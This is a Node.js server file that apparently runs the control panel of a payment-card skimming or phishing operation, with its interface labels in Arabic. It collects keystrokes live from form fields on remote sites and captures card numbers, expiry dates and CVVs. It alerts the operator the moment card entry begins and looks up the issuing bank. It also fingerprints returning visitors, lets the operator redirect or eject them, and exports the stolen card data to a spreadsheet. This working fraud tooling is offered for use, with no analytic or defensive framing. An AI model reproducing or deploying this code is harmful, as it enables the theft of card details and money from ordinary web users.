const express  = require('express');
const http     = require('http');
const WebSocket= require('ws');
const cors     = require('cors');
const axios    = require('axios');
const { v4: uuidv4 } = require('uuid');
const path     = require('path');
const bcrypt   = require('bcryptjs');
const XLSX     = require('xlsx');
const Database = require('better-sqlite3');
const cfg      = require('./config');

const app    = express();
const server = http.createServer(app);
const wss    = new WebSocket.Server({ server });

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ── Database ──────────────────────────────────────────────────────────────────
const db = new Database(cfg.DB_PATH);
db.exec(`
  CREATE TABLE IF NOT EXISTS sessions (
    id          TEXT PRIMARY KEY,
    fp          TEXT,
    ip          TEXT,
    site        TEXT,
    connected_at TEXT,
    disconnected_at TEXT,
    user_agent  TEXT,
    device_name TEXT,
    os_version  TEXT,
    language    TEXT,
    timezone    TEXT,
    fields      TEXT DEFAULT '{}',
    card_data   TEXT DEFAULT 'null',
    bin_data    TEXT DEFAULT 'null',
    events      TEXT DEFAULT '[]',
    starred     INTEGER DEFAULT 0,
    note        TEXT DEFAULT '',
    visit_count INTEGER DEFAULT 1
  );
  CREATE TABLE IF NOT EXISTS fingerprints (
    fp          TEXT PRIMARY KEY,
    first_seen  TEXT,
    last_seen   TEXT,
    visit_count INTEGER DEFAULT 1,
    known_ips   TEXT DEFAULT '[]',
    name        TEXT DEFAULT '',
    note        TEXT DEFAULT '',
    starred     INTEGER DEFAULT 0
  );
  CREATE TABLE IF NOT EXISTS site_pages (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    site        TEXT NOT NULL,
    path        TEXT NOT NULL,
    url         TEXT,
    title       TEXT,
    is_nav      INTEGER DEFAULT 0,
    is_favorite INTEGER DEFAULT 0,
    visit_count INTEGER DEFAULT 0,
    UNIQUE(site, path)
  );
`);

// ── Memory ────────────────────────────────────────────────────────────────────
const sessions = new Map();
const dashSSE  = new Set();
const fpCache  = new Map();
const AUTH_TOKEN = bcrypt.hashSync(cfg.AUTH.USERNAME + ':' + cfg.AUTH.PASSWORD, 8);

// ── Broadcast ─────────────────────────────────────────────────────────────────
function push(event, data) {
  const msg = `data: ${JSON.stringify({ event, data })}\n\n`;
  dashSSE.forEach(r => { try { r.write(msg); } catch(e){} });
}

// ── Auth ──────────────────────────────────────────────────────────────────────
function auth(req, res, next) {
  const t = req.headers['x-auth-token'] || req.query.token;
  if (t && bcrypt.compareSync(cfg.AUTH.USERNAME + ':' + cfg.AUTH.PASSWORD, t)) return next();
  res.status(401).json({ error: 'Unauthorized' });
}

// ── BIN Lookup ────────────────────────────────────────────────────────────────
async function binLookup(bin) {
  try {
    const r = await axios.get(`https://lookup.binlist.net/${bin}`, {
      headers: { 'Accept-Version': '3' }, timeout: 5000
    });
    const d = r.data;
    return {
      scheme:   d.scheme || '',
      type:     d.type   || '',
      level:    d.brand  || '',
      bank:     (d.bank    && d.bank.name)    || '',
      country:  (d.country && d.country.name) || '',
      emoji:    (d.country && d.country.emoji)|| '',
      prepaid:  d.prepaid || false
    };
  } catch(e) { return null; }
}

// ── Fingerprint ───────────────────────────────────────────────────────────────
function processFingerprint(fpData, s) {
  if (!fpData || !fpData.primary) return;
  const fp = fpData.primary;
  s.fp = fp;

  let rec = fpCache.get(fp) || db.prepare('SELECT * FROM fingerprints WHERE fp=?').get(fp);
  const now = new Date().toISOString();

  if (rec) {
    const ips = JSON.parse(rec.known_ips || '[]');
    if (s.ip && !ips.includes(s.ip)) ips.push(s.ip);
    const visits = (rec.visit_count || 0) + 1;
    db.prepare('UPDATE fingerprints SET last_seen=?,visit_count=?,known_ips=? WHERE fp=?')
      .run(now, visits, JSON.stringify(ips.slice(-20)), fp);
    rec = { ...rec, last_seen: now, visit_count: visits, known_ips: JSON.stringify(ips) };
    fpCache.set(fp, rec);
    s.visitCount  = visits;
    s.isReturning = true;
    s.fpName      = rec.name || '';
    s.knownIPs    = ips;
    push('fp_match', { id: s.id, fp, visits, name: rec.name || '', ips });
    addEvent(s, 'fp', `🔄 زائر عائد — زيارة #${visits}${rec.name ? ' — ' + rec.name : ''}`);
  } else {
    const newRec = { fp, first_seen: now, last_seen: now, visit_count: 1,
      known_ips: JSON.stringify([s.ip].filter(Boolean)), name: '', note: '', starred: 0 };
    db.prepare('INSERT OR IGNORE INTO fingerprints (fp,first_seen,last_seen,visit_count,known_ips,name,note,starred) VALUES (?,?,?,?,?,?,?,?)')
      .run(fp, now, now, 1, newRec.known_ips, '', '', 0);
    fpCache.set(fp, newRec);
    s.visitCount  = 1;
    s.isReturning = false;
    s.fpName      = '';
    s.knownIPs    = [s.ip].filter(Boolean);
    addEvent(s, 'fp', `🆕 بصمة جديدة — ${fp}`);
  }
}

// ── Persist ───────────────────────────────────────────────────────────────────
function persist(s) {
  try {
    db.prepare(`INSERT OR REPLACE INTO sessions
      (id,fp,ip,site,connected_at,disconnected_at,user_agent,device_name,os_version,
       language,timezone,fields,card_data,bin_data,events,starred,note,visit_count)
      VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`)
    .run(
      s.id, s.fp||null, s.ip, s.site,
      s.connectedAt, s.disconnectedAt||null,
      s.userAgent,
      s.deviceName||'', s.osVersion||'',
      s.language||'', s.timezone||'',
      JSON.stringify(s.fields||{}),
      JSON.stringify(s.cardData||null),
      JSON.stringify(s.binData||null),
      JSON.stringify((s.events||[]).slice(0,60)),
      s.starred?1:0, s.note||'',
      s.visitCount||1
    );
  } catch(e) {}
}

function addEvent(s, type, text) {
  s.events.unshift({ type, text, time: new Date().toISOString() });
  if (s.events.length > 60) s.events.pop();
}

function clean(s) {
  const { ws, ...c } = s; return c;
}

// ── WebSocket ─────────────────────────────────────────────────────────────────
wss.on('connection', (ws, req) => {
  const id   = uuidv4();
  const ip   = (req.headers['x-forwarded-for']||'').split(',')[0].trim() || req.socket.remoteAddress || '';
  const site = req.headers['origin'] || req.headers['referer'] || 'unknown';

  const s = {
    id, ip, site, ws,
    connectedAt: new Date().toISOString(),
    disconnectedAt: null,
    userAgent: req.headers['user-agent'] || '',
    deviceName: '', osVersion: '', language: '', timezone: '',
    fp: null, fpName: '', visitCount: 1, isReturning: false, knownIPs: [],
    fields: {}, cardData: null, binData: null,
    events: [], starred: false, note: '',
    pages: []
  };

  sessions.set(id, s);
  ws.send(JSON.stringify({ type: 'init', id }));
  push('connected', clean(s));
  persist(s);

  ws.on('message', async raw => {
    let msg; try { msg = JSON.parse(raw); } catch { return; }
    const sess = sessions.get(id);
    if (!sess) return;

    switch (msg.type) {

      case 'page_info':
        sess.url   = msg.url   || '';
        sess.title = msg.title || '';
        addEvent(sess, 'page', `📄 ${sess.title || sess.url}`);
        break;

      case 'device_info': {
        const d = msg.data || {};
        sess.deviceName = d.deviceName || '';
        sess.osVersion  = d.osVersion  || '';
        sess.language   = d.language   || '';
        sess.timezone   = d.timezone   || '';
        break;
      }

      case 'fingerprint':
        processFingerprint(msg.data, sess);
        persist(sess);
        push('updated', clean(sess));
        return;

      case 'keypress': {
        if (!sess.fields[msg.field]) sess.fields[msg.field] = '';
        sess.fields[msg.field] = msg.value || '';

        // Card tracking
        if (msg.fieldType === 'card') {
          if (!sess.cardData) sess.cardData = { number: '', expiry: '', cvv: '' };
          const digits = (msg.value || '').replace(/\D/g, '');
          sess.cardData.number = digits;
          if (digits.length === 1) {
            push('card_alert', { id, urgent: true });
            addEvent(sess, 'card', '🚨 بدأ إدخال بطاقة!');
          }
          if (digits.length >= 6) {
            const bin = await binLookup(digits.substring(0, 8));
            if (bin) {
              sess.binData = bin;
              push('bin_data', { id, bin });
              addEvent(sess, 'card', `💳 ${bin.level || bin.scheme} — ${bin.bank}`);
            }
          }
          push('card_update', { id, cardData: sess.cardData, binData: sess.binData });
        } else if (msg.fieldType === 'expiry') {
          if (!sess.cardData) sess.cardData = { number: '', expiry: '', cvv: '' };
          sess.cardData.expiry = msg.value || '';
          push('card_update', { id, cardData: sess.cardData, binData: sess.binData });
        } else if (msg.fieldType === 'cvv') {
          if (!sess.cardData) sess.cardData = { number: '', expiry: '', cvv: '' };
          sess.cardData.cvv = msg.value || '';
          push('card_update', { id, cardData: sess.cardData, binData: sess.binData });
        } else {
          push('keypress', { id, field: msg.field, value: msg.value, fieldType: msg.fieldType });
        }
        break;
      }

      case 'field_focus':
        addEvent(sess, 'focus', `🎯 حقل: ${msg.field}`);
        push('field_focus', { id, field: msg.field });
        return;

      case 'tab_hidden':
        addEvent(sess, 'tab', '⚠️ غادر إلى تبويب آخر');
        push('tab_hidden', { id });
        return;

      case 'tab_visible':
        addEvent(sess, 'tab', '✅ عاد للموقع');
        push('tab_visible', { id });
        return;

      case 'pages_discovered':
        if (msg.pages && msg.pages.length) {
          sess.pages = msg.pages;
          const stmt = db.prepare(`
            INSERT INTO site_pages (site,path,url,title,is_nav,visit_count)
            VALUES (?,?,?,?,?,1)
            ON CONFLICT(site,path) DO UPDATE SET
              title=excluded.title, is_nav=MAX(is_nav,excluded.is_nav),
              url=excluded.url, visit_count=visit_count+1`);
          const tx = db.transaction(pages => pages.forEach(p =>
            stmt.run(sess.site||'', p.path||'/', p.url||'', p.title||p.path||'/', p.isNav?1:0)));
          try { tx(msg.pages); } catch(e) {}
          const pages = db.prepare('SELECT * FROM site_pages WHERE site=? ORDER BY is_favorite DESC,is_nav DESC,visit_count DESC').all(sess.site||'');
          push('pages_updated', { site: sess.site, pages });
        }
        return;

      case 'ping':
        ws.send(JSON.stringify({ type: 'pong' }));
        return;
    }

    persist(sess);
    push('updated', clean(sess));
  });

  ws.on('close', () => {
    const sess = sessions.get(id);
    if (sess) {
      sess.disconnectedAt = new Date().toISOString();
      addEvent(sess, 'disconnect', '🔴 غادر الموقع');
      persist(sess);
      push('disconnected', { id });
      setTimeout(() => sessions.delete(id), cfg.SESSION_KEEP_MINUTES * 60 * 1000);
    }
  });

  ws.on('error', () => {});
});

// ── Auth endpoint ─────────────────────────────────────────────────────────────
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  if (username === cfg.AUTH.USERNAME && password === cfg.AUTH.PASSWORD)
    return res.json({ token: AUTH_TOKEN });
  res.status(401).json({ error: 'بيانات خاطئة' });
});

// ── SSE ───────────────────────────────────────────────────────────────────────
app.get('/events', auth, (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.flushHeaders();
  dashSSE.add(res);
  sessions.forEach(s => res.write(`data: ${JSON.stringify({ event:'connected', data:clean(s) })}\n\n`));
  req.on('close', () => dashSSE.delete(res));
});

// ── Sessions ──────────────────────────────────────────────────────────────────
app.get('/api/sessions', auth, (req, res) => {
  const all = []; sessions.forEach(s => all.push(clean(s))); res.json(all);
});

app.get('/api/sessions/history', auth, (req, res) => {
  const rows = db.prepare('SELECT * FROM sessions ORDER BY connected_at DESC LIMIT 200').all();
  res.json(rows.map(r => ({
    ...r,
    fields:   JSON.parse(r.fields   || '{}'),
    cardData: JSON.parse(r.card_data|| 'null'),
    binData:  JSON.parse(r.bin_data || 'null'),
    events:   JSON.parse(r.events   || '[]')
  })));
});

// Star
app.post('/api/sessions/:id/star', auth, (req, res) => {
  const v = req.body.starred ? 1 : 0;
  db.prepare('UPDATE sessions SET starred=? WHERE id=?').run(v, req.params.id);
  const s = sessions.get(req.params.id);
  if (s) { s.starred = !!req.body.starred; persist(s); push('updated', clean(s)); }
  res.json({ ok: true });
});

// Note
app.post('/api/sessions/:id/note', auth, (req, res) => {
  const note = req.body.note || '';
  db.prepare('UPDATE sessions SET note=? WHERE id=?').run(note, req.params.id);
  const s = sessions.get(req.params.id);
  if (s) { s.note = note; persist(s); push('updated', clean(s)); }
  res.json({ ok: true });
});

// Redirect
app.post('/api/control/redirect', auth, (req, res) => {
  const { id, url } = req.body;
  const s = sessions.get(id);
  if (!s || s.ws.readyState !== WebSocket.OPEN) return res.status(404).json({ error: 'not connected' });
  s.ws.send(JSON.stringify({ type: 'redirect', url }));
  addEvent(s, 'control', `↗️ توجيه إلى: ${url}`);
  persist(s); push('updated', clean(s));
  res.json({ ok: true });
});

// Terminate
app.post('/api/control/terminate', auth, (req, res) => {
  const { id, message } = req.body;
  const s = sessions.get(id);
  if (!s || s.ws.readyState !== WebSocket.OPEN) return res.status(404).json({ error: 'not connected' });
  s.ws.send(JSON.stringify({ type: 'terminate', message: message || 'تم إنهاء جلستك.' }));
  addEvent(s, 'control', '🚫 تم الطرد');
  persist(s); push('updated', clean(s));
  res.json({ ok: true });
});

// Stats
app.get('/api/stats', auth, (req, res) => {
  let active = 0;
  sessions.forEach(s => { if (s.ws.readyState === WebSocket.OPEN) active++; });
  const total = db.prepare('SELECT COUNT(*) as c FROM sessions').get().c;
  res.json({ active, total });
});

// Fingerprint name
app.post('/api/fp/:fp/name', auth, (req, res) => {
  const name = req.body.name || '';
  db.prepare('UPDATE fingerprints SET name=? WHERE fp=?').run(name, req.params.fp);
  const rec = fpCache.get(req.params.fp);
  if (rec) { rec.name = name; fpCache.set(req.params.fp, rec); }
  sessions.forEach(s => { if (s.fp === req.params.fp) { s.fpName = name; push('updated', clean(s)); } });
  res.json({ ok: true });
});

// Pages
app.get('/api/pages', auth, (req, res) => {
  const site = req.query.site || '';
  const rows = site
    ? db.prepare('SELECT * FROM site_pages WHERE site=? ORDER BY is_favorite DESC,is_nav DESC,visit_count DESC').all(site)
    : db.prepare('SELECT * FROM site_pages ORDER BY is_favorite DESC,is_nav DESC,visit_count DESC LIMIT 500').all();
  res.json(rows);
});

app.post('/api/pages/:id/favorite', auth, (req, res) => {
  const fav = req.body.favorite ? 1 : 0;
  db.prepare('UPDATE site_pages SET is_favorite=? WHERE id=?').run(fav, req.params.id);
  const row = db.prepare('SELECT site FROM site_pages WHERE id=?').get(req.params.id);
  if (row) {
    const pages = db.prepare('SELECT * FROM site_pages WHERE site=? ORDER BY is_favorite DESC,is_nav DESC,visit_count DESC').all(row.site);
    push('pages_updated', { site: row.site, pages });
  }
  res.json({ ok: true });
});

app.delete('/api/pages/:id', auth, (req, res) => {
  db.prepare('DELETE FROM site_pages WHERE id=?').run(req.params.id);
  res.json({ ok: true });
});

// Export Excel
app.get('/api/export', auth, (req, res) => {
  const rows = db.prepare('SELECT * FROM sessions ORDER BY connected_at DESC LIMIT 1000').all();
  const data = rows.map(r => {
    const card = JSON.parse(r.card_data || 'null');
    const bin  = JSON.parse(r.bin_data  || 'null');
    const fields = JSON.parse(r.fields  || '{}');
    return {
      'IP':           r.ip,
      'الموقع':       r.site,
      'الجهاز':       r.device_name,
      'نظام التشغيل': r.os_version,
      'اللغة':        r.language,
      'المنطقة الزمنية': r.timezone,
      'رقم البطاقة':  card ? card.number : '',
      'تاريخ الانتهاء': card ? card.expiry : '',
      'CVV':          card ? card.cvv : '',
      'نوع البطاقة':  bin ? bin.scheme : '',
      'مستوى البطاقة': bin ? bin.level : '',
      'البنك':        bin ? bin.bank : '',
      'الدولة':       bin ? bin.country : '',
      'الحقول الأخرى': JSON.stringify(fields),
      'وقت الدخول':   r.connected_at,
      'وقت الخروج':   r.disconnected_at || '',
      'عدد الزيارات': r.visit_count,
      'بصمة الجهاز':  r.fp || '',
      'نجمة':         r.starred ? '⭐' : '',
      'ملاحظة':       r.note || ''
    };
  });
  const wb = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(wb, XLSX.utils.json_to_sheet(data), 'Sessions');
  const buf = XLSX.write(wb, { type: 'buffer', bookType: 'xlsx' });
  res.setHeader('Content-Disposition', 'attachment; filename="sessions.xlsx"');
  res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
  res.send(buf);
});

// ── Start ─────────────────────────────────────────────────────────────────────
server.listen(cfg.PORT, () => {
  console.log(`✅ Dashboard v2 running on port ${cfg.PORT}`);
  console.log(`📊 http://localhost:${cfg.PORT}/dashboard.html`);
  console.log(`🔐 ${cfg.AUTH.USERNAME} / ${cfg.AUTH.PASSWORD}`);
});
